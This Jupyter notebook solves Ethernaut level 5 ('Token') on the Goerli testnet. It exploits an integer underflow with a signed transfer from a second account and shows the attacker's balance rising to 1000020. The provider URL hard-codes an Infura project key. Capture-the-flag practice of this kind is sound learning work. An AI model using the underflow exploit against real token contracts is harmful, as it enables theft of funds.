{
 "cells": [
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "---\n",
    "title: (05) Token\n",
    "description: https://ethernaut.openzeppelin.com/level/0xB4802b28895ec64406e45dB504149bfE79A38A57\n",
    "show-code: True\n",
    "---"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![](https://ethernaut.openzeppelin.com/imgs/BigLevel5.svg)\n",
    "# (05) Token\n",
    "## https://ethernaut.openzeppelin.com/level/0xB4802b28895ec64406e45dB504149bfE79A38A57"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### We can transfer pretty much any value and the require statement will be bypassed because of integer underflow (this was fixed in later versions of Solidity). We will gain that value of the token. We have to use two accounts for this, one to author the transaction and the other to receive the tokens."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "from web3 import Web3\n",
    "from dotenv import load_dotenv\n",
    "from IPython.display import display, HTML\n",
    "import os\n",
    "import json\n",
    "\n",
    "load_dotenv()\n",
    "\n",
    "provider_url = 'https://goerli.infura.io/v3/69194ec6319d4463b70ef7215e7ee7a7'\n",
    "web3 = Web3(Web3.HTTPProvider(provider_url))\n",
    "account = '0x40db04A87232880606804fd841220Bb925224878'\n",
    "private_key = os.getenv('PRIVATE_KEY_2')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "with open('abi/token_abi.json', 'r') as f:\n",
    "\tabi = json.load(f)\n",
    "\n",
    "contract_address = '0xAE433d0d5B2185E5Ac29160c810e151D8E5d0dB2'\n",
    "\n",
    "contract = web3.eth.contract(address=contract_address, abi=abi)\n",
    "contract.functions.balanceOf(account).call()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<a href=\"https://goerli.etherscan.io/tx/0x23089b50dd5ef550c4ab5fc10391532265524a664ab9384285595b84fccb1cf1\">0x23089b50dd5ef550c4ab5fc10391532265524a664ab9384285595b84fccb1cf1</a>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "real_account  = '0xf0522A86a6BEb833F9E988596Fc9dF2F5CdD9C55'\n",
    "\n",
    "tx = {\n",
    "    'nonce': web3.eth.getTransactionCount(account),\n",
    "    'gas': 2000000,\n",
    "    'gasPrice': web3.toWei('50', 'gwei'),\n",
    "}\n",
    "\n",
    "tx = contract.functions.transfer(real_account, 1000000).build_transaction(tx)\n",
    "\n",
    "signed_tx = web3.eth.account.sign_transaction(tx, private_key)\n",
    "\n",
    "tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)\n",
    "\n",
    "display(HTML(f'<a href=\"https://goerli.etherscan.io/tx/{web3.toHex(tx_hash)}\">{web3.toHex(tx_hash)}</a>'))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1000020"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "contract.functions.balanceOf(real_account).call()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.6"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "b0fa6594d8f4cbf19f97940f81e996739fb7646882a419484c72d19e05852a7e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
